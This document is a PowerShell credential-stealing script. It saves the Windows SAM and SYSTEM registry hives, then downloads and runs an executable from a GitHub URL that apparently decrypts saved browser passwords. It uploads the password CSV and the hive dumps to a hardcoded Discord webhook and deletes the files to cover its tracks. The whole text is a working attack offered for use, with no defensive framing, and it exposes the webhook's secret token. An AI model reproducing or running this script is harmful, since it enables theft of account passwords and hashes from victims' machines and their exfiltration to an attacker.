cd $env:TMP
reg save HKLM\sam ./sam.save
reg save HKLM\system ./system.save

iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:TMP\d.exe
Start-process "$env:TMP\d.exe"
start-sleep 5
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1184838069740896326/B30LAh5X9NkQ111endVELXK2MBQRblzduqnE2tcSjRhPXn3dEnLCrUp-5hjj6mVGIYEk'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
Upload-Discord -file $env:TMP\decrypted_password.csv
Upload-Discord -file $env:TMP\sam.save
Upload-Discord -file $env:TMP\system.save
rm "$env:TMP\decrypted_password.csv" -r -Force -ErrorAction SilentlyContinue
rm "$env:TMP\d.exe" -r -Force -ErrorAction SilentlyContinue
rm "$env:TMP\sam.save" -r -Force -ErrorAction SilentlyContinue
rm "$env:TMP\system.save" -r -Force -ErrorAction SilentlyContinue
